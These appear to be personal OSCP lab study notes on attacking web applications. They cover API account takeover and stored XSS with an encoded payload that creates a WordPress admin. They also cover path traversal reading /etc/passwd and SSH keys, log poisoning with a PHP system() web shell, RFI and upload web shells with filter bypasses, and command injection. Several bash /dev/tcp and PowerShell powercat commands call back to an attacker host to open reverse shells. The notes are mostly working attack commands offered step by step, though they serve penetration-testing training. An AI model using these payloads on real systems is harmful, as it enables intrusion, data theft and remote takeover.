## Enumeration

>[!code]- Nmap - Banner & Scripts
>Grab banner:
>```bash
>kali@kali:~$ sudo nmap -p80 -sV 192.168.50.20
>```
>
>___
>
>Execute HTTP related scripts:
>```bash
>kali@kali:~$ sudo nmap -p80 --script=http-enum 192.168.50.20
>```

>[!code]- Gobuster - Directory Brute Forcing
>- **-t** number of threads
>```bash
>kali@kali:~$ gobuster dir -u 192.168.50.20 -w /usr/share/wordlists/dirb/common.txt -t 5
>```

>[!code]- Developer Tools - Sources & HTML Inspector
>**Debugger**
>Displays the page's resources and content. It may display JS frameworks, hidden input fields, comments, JavaScript etc.
>>[!info]- Screenshot
>>![Pasted image 20240520053033](../Images/Pasted%20image%2020240520053033.png)
>
>___
>
>**Inspector**
>Right-clicking an element on a page then _Inspect_ will show that element's source HTML. It could be used for finding hidden form fields, for example. 
>
>>[!info]- Screenshot
>>![Pasted image 20240520053205](../Images/Pasted%20image%2020240520053205.png)

>[!code]- Developer Tools - Network
>_Developer Tools > Network_
>
>The web server software, as well as other used technologies, could be inferred from the headers. The non-standard header `x-amz-cf-id` indicates the use of Amazon CloudFront.
>
>![Pasted image 20240520053828](../Images/Pasted%20image%2020240520053828.png)

>[!code]- sitemap.xml and robots.txt
>**Sitemaps** outline the directories bots can crawl, whereas **robots.txt** outlines the directories not to crawl.

>[!code]- APIs
>Many web applications use APIs.
>
>____
>
>**Brute forcing API endpoints**
>
>API paths are often followed by a version number, resulting in a pattern like:
>	`/api_name/v1`
>
>```bash
># 'pattern' file
>{GOBUSTER}/v1
>{GOBUSTER}/v2
>
>kali@kali:~$ gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
>```
>
>___
>
>**Enumerating a found endpoint**
>
>```bash
>kali@kali:~$ curl -i http://192.168.50.16:5002/users/v1 HTTP/1.0 200 OK  
>Content-Type: application/json  
>Content-Length: 241
>
>Server: Werkzeug/1.0.1 Python/3.7.13
>Date: Wed, 06 Apr 2022 09:27:50 GMT
>
>{  
>	"users": [
>		{  
>			"email": "admin@mail.com",
>			"username":"admin"
>		}, #...
>	]
>}
>```
>
>```bash
>kali@kali:~$ gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt
>```
>The **password** directory is found.
>
>```bash
>kali@kali:~$ curl -i http://192.168.50.16:5002/users/v1/admin/password
>```
## Attacks
#### Default Credentials

- admin:admin
#### APIs

>[!code]- Attempting to login and create a new user
>Login:
>```bash
>kali@kali:~$ curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/login
>
># response:
{ "status": "fail", "message": "Password is not correct for the given username."}
>```
>
>____
>
>Creating a new user:
>```bash
>kali@kali:~$ curl -d '{"password":"lab","username":"offsecadmin"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register
>
># response:
{ "status": "fail", "message": "'email' is a required property"}
>```
>
>Works when we added an email:
>
>```bash
>kali@kali:~$curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register
>
># response:
>{"message": "Successfully registered. Login to receive an auth token.", "status": "success"}
>```
>
>___
>
>Login attempt with newly created user:
>
>```bash
>kali@kali:~$curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/login  
>
># response:
>{"auth_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwi c3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew", "message": "Successfully logged in.", "status": "success"}
>```

>[!code]- Attempting to change the admin password
>Using GET returns an error:
>```bash
>kali@kali:~$ curl \
>	'http://192.168.50.16:5002/users/v1/admin/password' \
>	-H 'Content-Type: application/json' \  
>	-H 'Authorization: OAuth
>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic 3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew' \
>	-d '{"password": "pwned"}'
>
># response:
>{  
>	"detail": "The method is not allowed for the requested URL.", "status": 405,  
>	"title": "Method Not Allowed",  
>	"type": "about:blank"
>}
>```
>But using using PUT appears to work:
>```bash
>kali@kali:~$ curl -X 'PUT' \
>	'http://192.168.50.16:5002/users/v1/admin/password' \
>	-H 'Content-Type: application/json' \  
>	-H 'Authorization: OAuth
>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic 3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
>	-d '{"password": "pwned"}'
>```
#### Cross-Site Scripting (XSS)

>[!info]- Info - Stored, Reflected & DOM-based XSS
>Stored XSS attacks occur when the exploit payload is stored in a database or otherwise cached by a server. The web app then retrieves this payload and displays it to anyone who visits a vulnerable page.
>
>___
>
>Reflected XSS attacks usually include the payload in a crafted request or link. The web app takes this value and places it into the page content. This XSS variant only attacks the person submitting the request or visiting the link. Reflected XSS can occur anywhere user input is included in error messages.
>
>___
>
>DOM-based XSS can be stored or reflected. DOM-based XSS attacks occur when a browser parses the page's content and inserted JavaScript is executed.

>[!info]- Setup - The website uses the User-Agent value from a request
>A website uses the Users plugin, which logs information about the users to the website upon the plugin being loaded (this was discovered through source code review of the plugin). The plugin takes the information stored within the User-Agent string of a request to the website and puts it directly (without sanitisation) into a HTML table.

>[!exploit]- Exploit - We can manipulate the User-Agent string with an XSS payload
>As the User Agent header value is under our control, we could craft an XSS attack by inserting a script tag invoking the _alert()_ method to generate a pop-up message. This alert will be shown to any user that loads the plugin.
##### Creating an alert

>[!code]- Craft and send the malicious payload
>Go to the vulnerable website **http://offsecwp/** and then send that request to Repeater in Burp.
>
>![Pasted image 20240521044434](../Images/Pasted%20image%2020240521044434.png)
>
>___
>
>Replace the default User-Agent value with a script tag that includes **\<script>alert(42)\</script>** and then send the request.

>[!code]- Verify the payload worked
>If we navigate to the Visitors plugin console at **http://offsecwp/wp-admin/admin.php?page=visitors-app%2Fadmin%2Fstart.php**, we are greeted with a pop-up banner showing the number 42, proving that our code injection worked.
>
>![Pasted image 20240521044534](../Images/Pasted%20image%2020240521044534.png)
##### Creating a new admin account

##### Via stealing cookie information

>[!info]- Info - _Secure_ and _HttpsOnly_ cookie flags
>The _Secure_ flag instructs the browser to only send the cookie over encrypted connections, like HTTPS.
>
>The _HttpOnly_ flag instructs the browser to deny JavaScript access to the cookie.

>[!exploit]- Exploit - Steal a user's cookie
>If the _HttpOnly_ flag is not set then we can use an XSS payload to steal the cookie.

>[!fail]- Fail - None of the cookies can be read through JavaScript
>All the relevant cookies have the _HttpOnly_ flag set.
>![Pasted image 20240521050932](../Images/Pasted%20image%2020240521050932.png)
##### Via stealing the admin nonce

>[!code]- Create the malicious Javascript code
>Gather the admin nonce.
>```javascript
>var ajaxRequest = new XMLHttpRequest();  
>var requestURL = "/wp-admin/user-new.php";  
>var nonceRegex = /ser" value="([^"]*?)"/g; ajaxRequest.open("GET", requestURL, false); ajaxRequest.send();  
>var nonceMatch = nonceRegex.exec(ajaxRequest.responseText); var nonce = nonceMatch[1];
>```
>____
>
>Create a POST request to create a new admin user.
>```javascript
>var params = "action=createuser&_wpnonce_create-
>user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2= attackerpass&role=administrator";  
>ajaxRequest = new XMLHttpRequest();  
>ajaxRequest.open("POST", requestURL, true); ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"); ajaxRequest.send(params);
>```

>[!code]- Minify and encode our attack code
>**Minify** - Paste the entire code into [JS Compress](https://jscompress.com/)
>>[!info]- Screenshot
>>![Pasted image 20240521052421](../Images/Pasted%20image%2020240521052421.png)
>
>___
>
>**Encode** - Using this function. (It will parse the minified JS string parameter and convert each character into the corresponding UTF-16 integer code using the _charCodeAt_ method):
>```javascript
>function encode_to_javascript(string) {
>	var input = string
>	var output = '';  
>	for(pos = 0; pos < input.length; pos++) {
>		output += input.charCodeAt(pos);
>		if(pos != (input.length - 1)) {
>			output += ",";
>		}
>	}
>	return output;
>}
>let encoded = encode_to_javascript('insert_minified_javascript')
>console.log(encoded)
>```
>>[!info]- Screenshot
>>![Pasted image 20240521053303](../Images/Pasted%20image%2020240521053303.png)

>[!code]- Send the minified, encoded code
>```bash
>kali@kali:~$ curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(118,97,114,32,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,44,114,101,113,117,101,115,116,85,82,76,61,34,47,119,112,45,97,100,109,105,110,47,117,115,101,114,45,110,101,119,46,112,104,112,34,44,110,111,110,99,101,82,101,103,101,120,61,47,115,101,114,34,32,118,97,108,117,101,61,34,40,91,94,34,93,42,63,41,34,47,103,59,97,106,97,120,82,101,113,117,101,115,116,46,111,112,101,110,40,34,71,69,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,49,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,41,59,118,97,114,32,110,111,110,99,101,77,97,116,99,104,61,110,111,110,99,101,82,101,103,101,120,46,101,120,101,99,40,97,106,97,120,82,101,113,117,101,115,116,46,114,101,115,112,111,110,115,101,84,101,120,116,41,44,110,111,110,99,101,61,110,111,110,99,101,77,97,116,99,104,91,49,93,44,112,97,114,97,109,115,61,34,97,99,116,105,111,110,61,99,114,101,97,116,101,117,115,101,114,38,95,119,112,110,111,110,99,101,95,99,114,101,97,116,101,45,117,115,101,114,61,34,43,110,111,110,99,101,43,34,38,117,115,101,114,95,108,111,103,105,110,61,97,116,116,97,99,107,101,114,38,101,109,97,105,108,61,97,116,116,97,99,107,101,114,64,111,102,102,115,101,99,46,99,111,109,38,112,97,115,115,49,61,97,116,116,97,99,107,101,114,112,97,115,115,38,112,97,115,115,50,61,97,116,116,97,99,107,101,114,112,97,115,115,38,114,111,108,101,61,97,100,109,105,110,105,115,116,114,97,116,111,114,34,59,40,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,41,46,111,112,101,110,40,34,80,79,83,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,48,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,34,67,111,110,116,101,110,116,45,84,121,112,101,34,44,34,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,34,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,112,97,114, 97,109,115,41,59))</script>" --proxy 127.0.0.1:8080
>```

>[!code]- Wait for the admin user to login
>(This was simulated for us.) By logging in, the vulnerable Users plugin adds a row to the table, including the malicious User-Agent string we sent before directly into the table.
>
>![Pasted image 20240521054625](../Images/Pasted%20image%2020240521054625.png)
>
>___
>
>We can verify the attack worked by going to the Users panel. It shows our new admin user was added.
>
>![Pasted image 20240521054702](../Images/Pasted%20image%2020240521054702.png)
#### Directory Traversal
##### On Linux

>[!exploit]- The website retrieves files via the _page_ parameter
>When visiting **http://mountaindesserts.com/meteor/index.php?page=admin.php** the page displays the same content at the bottom...
>
>![Pasted image 20240521061253](../Images/Pasted%20image%2020240521061253.png)
>
>...as **mountaindesserts.com/meteor/admin.php**:
>
>![Pasted image 20240521061309](../Images/Pasted%20image%2020240521061309.png)

>[!code]- Use the page parameter to read /etc/passwd
>```bash
>http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd
>```
>
>![Pasted image 20240521061524](../Images/Pasted%20image%2020240521061524.png)

>[!code]- Use the page parameter to read SSH private keys
>```bash
>kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa
>```
##### On Windows

>[!code]- Test a directory traversal vulnerability
>`C:\Windows\System32\drivers\etc\hosts` is readable by all users. By displaying this file, we can confirm the vulnerability exists.
##### Reading Log Files

>[!code]- Read log files
>For example, IIS server has its log file stored within:
>- `C:\inetpub\wwwroot\web.config`
>- `C:\inetpub\logs\LogFiles\W3SVC1\`.
##### Encoding Characters

>[!fail]- Sometimes `../../` doesn't work
>Firewalls, the web server, the web app, or the web application firewall catches the `../../` and knows its a directory traversal attack and removes it.

>[!exploit]- Encoding the characters could bypass application filtering

>[!code]- URL encode the dots in `../`
>From:
>```bash
>kali@kali:/var/www/html$ curl http://192.168.50.16/cgi-bin/../../../../../../../../../../etc/passwd
>```
>To:
>```bash
>kali@kali:/var/www/html$ curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
>```
#### File Inclusion

>[!info]- Info - File Inclusion vs Directory Traversal
>**TLDR: directory traversal allows us to read the contents of a file only, file inclusion can execute a file too.**
>
>Directory traversal vulnerabilities obtain the contents of a file outside of the web server's web root. _File inclusion_ vulnerabilities allow us to 'include' a file in the application's running code.
>
>This means we can use file inclusion vulnerabilities to execute local or remote files, while directory traversal only allows us to read the contents of a file. File inclusion allows us to show the contents of a non-executable file too.
>
>For example, levering a directory traversal  vulnerability and specifying the file **admin.php**, the source code of the PHP file will be displayed. On the other hand, a file inclusion vulnerability can execute the **admin.php** file.
#### Local File Inclusion (LFI)
##### Log Poisoning

>[!code]- Find what information is stored in the Apache access log
>The User-Agent string is:
>```bash
>kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/a pache2/access.log  
>...  
>192.168.50.1 - - [12/Apr/2022:10:34:55 +0000] "GET /meteor/index.php?page=admin.php HTTP/1.1" 200 2218 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"  
>...
>```

>[!success] The User Agent string (which is controllable) is stored in access.log

>[!exploit]- Exploit - Poison `access.log` with executable code via the User Agent string and then user LFI to execute it

>[!code]- Make a request with a malicious User Agent string
>Malicious User Agent string; it accepts a command via the _cmd_ parameter and executes it via the PHP _system_ function:
>```php
><?php echo system($_GET['cmd']); ?>
>```
>
>![Pasted image 20240522050802](../Images/Pasted%20image%2020240522050802.png)

>[!code]- Execute the poisoned log and obtain command execution
>To execute the **ps** command:
>![Pasted image 20240522051122](../Images/Pasted%20image%2020240522051122.png)
>
>___
>
>To execute the **ls -la** command (encode the space):
>![Pasted image 20240522051349](../Images/Pasted%20image%2020240522051349.png)

>[!code]- Obtain a reverse shell via the poisoned log
>```bash
>bash -i >& /dev/tcp/192.168.119.3/4444 0>&1
>```
>Though we may need to ensure it gets executed with Bash, as the default may be `sh`:
>```bash
>bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
>```
>URL encode any special characters:
>```bash
>bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
>```
>Send the request:
>
>![Pasted image 20240522051756](../Images/Pasted%20image%2020240522051756.png)
##### On Windows

>[!info]- Info - What to change for Windows
>The PHP code snippet for Linux above also works on Windows. When log poisoning on Windows, we must understand that the logs we probably be in a different logs, eg Apache logs on Windows might be in `C:\xampp\apache\logs\`.
#### PHP Wrappers

>[!info]- Info - PHP Wrappers
>PHP wrappers can be used to represent and access local or remote filesystems. We can use these wrappers to bypass filters or obtain code execution via _File Inclusion vulnerabilities_ in PHP web apps.
##### The php://filter Wrapper

>[!exploit]- Exploit - php://filter can display the contents of executable files
>Allows us to display the contents of executable files such as **.php** files (unlike LFI which would execute them).

>[!code]- Display the contents of a PHP file by base64 encoding it
>The following will cause the requested php page to be executed. The wrapper uses **resource** as the required parameter to specify the file stream for filtering, which is the filename in this case.
>```bash
>kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php
>```
>![Pasted image 20240522054900](../Images/Pasted%20image%2020240522054900.png)
>
>___
>
>The following will prevent the requested php page from being executed, as it is encoded with base64 by adding **convert.base64-encode**.
>```bash
>kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
>```
>
>![Pasted image 20240522054839](../Images/Pasted%20image%2020240522054839.png)

>[!code]- Base64 decode the returned data
>
>![Pasted image 20240522055051](../Images/Pasted%20image%2020240522055051.png)
##### The data:// Wrapper

>[!warning]- Limitation this wrapper is not enabled by default
>The _allow_url_include_ setting of the PHP installation needs to be enabled.

>[!exploit]- Exploit - php://data can achieve code execution
>To use the wrapper, we'll add **data://** followed by the data type and content.

>[!code]- Execute a system command
> We are able to get the `ls` command executed:
>```bash
>kali@kali:~$ curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20sy stem('ls');?>"
>```
>![Pasted image 20240522055622](../Images/Pasted%20image%2020240522055622.png)
>

___

>[!warning]- Warning - Firewalls may filter strings like 'system'

>[!code]- Bypass firewall filtering by encoding the code
>Encode the malicious code:
>```bash
>kali@kali:~$ echo -n '<?php echo system($_GET["cmd"]);?>' | base64 PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==
>```
>Make the request, with the command passed to the `cmd` parameter:
>```bash
>kali@kali:~$ curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZW NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg\==&cmd=ls"
>```
>![Pasted image 20240522060020](../Images/Pasted%20image%2020240522060020.png)
#### Remote File Inclusion (RFI)

>[!warning]- Limitation - the PHP _allow_url_include_ option (disabled by default) must be enabled

>[!info]- Info - RFI vs LFI
>RFI allows us to include files from a remote system over _HTTP_ or _SMB_.

>[!exploit]- We can include a PHP webshell to execute commands

>[!info]- Info - The used webshell takes a command via the _cmd_ parameter
>
>![Pasted image 20240522061913](../Images/Pasted%20image%2020240522061913.png)

>[!code]- Make the remote file (the webshell) accessible
>```bash
>kali@kali:/usr/share/webshells/php/$ python3 -m http.server 80
>```

>[!code]- Use RFI to execute the webshell
>```bash
>kali@kali:/usr/share/webshells/php/$ curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple- backdoor.php&cmd=ls"
>```
>
>![Pasted image 20240522062054](../Images/Pasted%20image%2020240522062054.png)







#### File Uploads

>[!exploit]- Vulnerability - The website allows uploads of various files

>[!code]- Identify which web shell to upload
>The website's icon suggests it uses XAMPP, suggesting a PHP web shell is required:
>
>![Pasted image 20240523045224](../Images/Pasted%20image%2020240523045224.png)
>
>If the website was using ASP instead of PHP, for example, we could upload an ASP web shell: 
>
>![Pasted image 20240523045310](../Images/Pasted%20image%2020240523045310.png)

>[!code]- Upload a web shell
>>[!fail]- It blocked our upload of `simple-backdoor.php` as "PHP extensions are blacklisted"
>
>Renaming to extension to either `.pHP`, `.phps`, `.php7` or `.phtml` worked.
>
>![Pasted image 20240523042702](../Images/Pasted%20image%2020240523042702.png)

>[!code]- Use the uploaded web shell to execute commands
>dir:
>```bash
>kali@kali:~$ curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=dir
>```
>Reverse shell by uploading an [](../OSCP%20Flow.md#^cb742d|PowerShell%20encoded%20one-liner). The base64 encoded string for the powershell command uses the **-enc** parameter. We'll also need to use URL encoding for the spaces.
>```bash
>kali@kali:~$ curl http://192.168.50.189/meteor/uploads/simple- backdoor.pHP?cmd=powershell%20- enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUA dAAuAFMAbwBjAGsAZQB0
>... AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjA GwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
>```

___

>[!exploit]- Vulnerability - The website allows us our uploaded file to overwrite existing files

>[!code]- Upload a file and edits its file path in Burp
>Change it from
>- `Content-Disposition: form-data; name="myFile"; filename="text.txt"` to
>- `Content-Disposition: form-data; name="myFile"; filename="../../../../../../text.txt"`:
>
>![Pasted image 20240523045940](../Images/Pasted%20image%2020240523045940.png)
>
>---
>
>It's possible the web apps response merely echoed our filename and sanitised it internally.

>[!code]- Edit the filename so that it overwrites another file (eg `authorized_keys`)
>Let's try to overwrite the **authorised_keys** file in the home directory for _root_.
>
>___
>
>First, create an SSH keypair with **ssh-keygen**:
>```bash
>kali@kali:~$ ssh-keygen
>```
>
>Second, add the created public key into our **authorized_keys** file:
>```bash
>kali@kali:~$ cat fileup.pub > authorized_keys
>```
>
>Third, upload the **authorized_keys** file and edit its relative file path with Burp so that it overwrites any existing authorized_keys file on the victim machine.
>
>![Pasted image 20240523051155](../Images/Pasted%20image%2020240523051155.png)
>
>Fourth, use the corresponding private key to SSH into the victim machine:
>```bash
>kali@kali:~$ ssh -p 2222 -i fileup root@mountaindesserts.com
>```
#### Command Injection

>[!exploit]- Vulnerability - The website accepts shell commands
>
>![Pasted image 20240523052834](../Images/Pasted%20image%2020240523052834.png)

>[!code]- Inject an arbitrary test command instead with Burp
>The request shows that the POST "Archive" parameter is used to send the command:
>
>![Pasted image 20240523053128](../Images/Pasted%20image%2020240523053128.png)
>

>[!code]- Use curl to interact with the web app more easily
>We'll use **--data** to specify what data is sent in the POST request:
>```bash
>kali@kali:~$ curl -X POST --data 'Archive=ipconfig' http://192.168.50.189:8000/archive
>```
>![Pasted image 20240523053322](../Images/Pasted%20image%2020240523053322.png)
>The web app detects a command inject attempt with the **ipconfig** command.
>
>___
>
>Let's try to work out what commands work, starting simple:
>```bash
>kali@kali:~$ curl -X POST --data 'Archive=git' http://192.168.50.189:8000/archive
>
>\<git man page returned>
>
>kali@kali:~$ curl -X POST --data 'Archive=git version' http://192.168.50.189:8000/archive
>
>\<git version returned>
>```
>
>___
>
>Let's try to combine the command we want to execute (**ipconfig**) with the command we know works (**git**) by using a URL encoded semicolon (**%3B**):
>```bash
>kali@kali:~$ curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.50.189:8000/archive
>
>\<git manual returned followed by ipconfig output>
>```
>
>The above worked. We can assume there is filter which checks if "git" is executed or perhaps contained in the "Archive" parameter

>[!code]- Determine whether our commands are executed by PowerShell or CMD
>The unencoded command to determine:
>```powershell
>(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
>```
>
>The POST request with the command encoded:
>```bash
>kali@kali:~$ curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20P owerShell' http://192.168.50.189:8000/archive
>
>...  
>See 'git help git' for an overview of the system.
>PowerShell
>```

>[!code]- Download and execute a reverse shell
>Setup a web server on Kali that serves the powercat PS1:
>```bash
>kali@kali:~$ cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
>
>kali@kali:~$ python3 -m http.server 80
>```
>Start a listener on Kali:
>```bash
>kali@kali:~$ nc -nvlp 4444
>```
>Create a command which causes the web app to download the served powercat PS1 and executes it:
>```powershell
>IEX (New-ObjectSystem.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell
>```
>URL encode the command and send it in a POST request:
>```bash
>kali@kali:~$ curl -X POST --data 'Archive=git%3BIEX%20(New- Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.119.3%2Fpowercat .ps1%22)%3Bpowercat%20-c%20192.168.119.3%20-p%204444%20-e%20powershell' http://192.168.50.189:8000/archive
>```

